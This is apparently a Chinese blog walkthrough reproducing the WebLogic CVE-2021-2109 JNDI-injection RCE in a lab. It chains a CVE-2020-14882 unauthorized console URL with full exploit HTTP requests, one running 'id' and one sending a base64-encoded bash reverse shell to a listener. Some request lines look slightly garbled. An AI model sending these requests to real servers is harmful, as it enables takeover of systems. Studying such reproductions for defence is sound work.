**目录**

[漏洞背景](#t0 "漏洞背景")

[漏洞影响版本](#t1 "漏洞影响版本")

[漏洞复现](#t2 "漏洞复现")

[环境搭建](#t3 "环境搭建")

[命令执行](#t4 "命令执行")

[反弹shell](#t5 "反弹shell")

* * *

漏洞背景
----

2021年1月20日，Oracle官方发布了漏洞补丁，修了包括 CVE-2021-2109 [Weblogic](https://so.csdn.net/so/search?q=Weblogic&spm=1001.2101.3001.7020) Server远程代码执行漏洞在内的多个高危严重漏洞。CVE-2021-2109 中，攻击者可构造恶意请求，造成JNDI注入，执行任意代码，从而控制服务器。该漏洞为Weblogic的远程代码执行漏洞，主要由JNDI注入，导致攻击者可利用此漏洞远程代码执行，危险等级高。

漏洞影响版本
------

*   Weblogic Server 10.3.6.0.0
*   Weblogic Server 12.1.3.0.0
*   Weblogic Server 12.2.1.3.0
*   Weblogic Server 12.2.1.4.0
*   Weblogic Server 14.1.1.0.0

漏洞复现
----

### 环境搭建

使用Vulhub的CVE-2020-14882漏洞环境来复现，如下启动漏洞环境。

![](https://img-blog.csdnimg.cn/20210206155815574.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

![](https://img-blog.csdnimg.cn/20210206155853717.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

使用CVE-2020-14882未授权访问登录后台。未授权地址：[http://192.168.106.6:7001/console/css/%252e%252e%252fconsole.portal](http://192.168.106.6:7001/console/css/%252e%252e%252fconsole.portal "http://192.168.106.6:7001/console/css/%252e%252e%252fconsole.portal")

![](https://img-blog.csdnimg.cn/20210206160332574.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

### 命令执行

开启JNDI监听

![](https://img-blog.csdnimg.cn/20210206180813695.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

发送数据包

```
POST /console/css/%252e%252e/consolejndi.portal?_pageLabel=JNDIBindingPageGeneral&_nfpb=true&JNDIBindingPortlethandle=com.bea.console.handles.JndiBindingHandle(%22ldap://192.168.106;1:1389/Basic/WeblogicEcho;AdminServer%22) HTTP/1.1      
Host: 192.168.106.6:7001      
Pragma: no-cache      
Cache-Control: no-cache      
Upgrade-Insecure-Requests: 1      
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 11_1_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.146 Safari/537.36      
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9      
Accept-Encoding: gzip, deflate      
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8      1
cmd:id      1
Cookie: rememberMe=1; ADMINCONSOLESESSION=SHZ2XSBhINTtK05OkiYc3YmbENIp5MODNGWF7EaAje_adp2PQ58L!-286302025; rememberMe=1      1
Connection: close
```


![](https://img-blog.csdnimg.cn/20210206180942983.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

### 反弹shell

```
POST /console/css/%252e%252e/consolejndi.portal?_pageLabel=JNDIBindingPageGeneral&_nfpb=true&JNDIBindingPortlethandle=com.bea.console.handles.JndiBindingHandle(%22ldap://192.168.106;1:1389/Basic/WeblogicEcho;AdminServer%22) HTTP/1.1      
Host: 192.168.106.6:7001      
Pragma: no-cache      
Cache-Control: no-cache      
Upgrade-Insecure-Requests: 1      
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 11_1_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.146 Safari/537.36      
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9      
Accept-Encoding: gzip, deflate      
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8      1
cmd:bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEwNi4xLzQ0NDQgMD4mMQ==}|{base64,-d}|{bash,-i}      1
Cookie: rememberMe=1; ADMINCONSOLESESSION=SHZ2XSBhINTtK05OkiYc3YmbENIp5MODNGWF7EaAje_adp2PQ58L!-286302025; rememberMe=1      1
Connection: close
```


![](https://img-blog.csdnimg.cn/20210206181242489.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

  如果想跟我一起讨论的话，就快加入我的知识星球吧。星球里有一千多位同样爱好安全技术的小伙伴一起交流！

![](https://img-blog.csdnimg.cn/1219ed79e9ed449d85d27b732cda5ea6.jpg)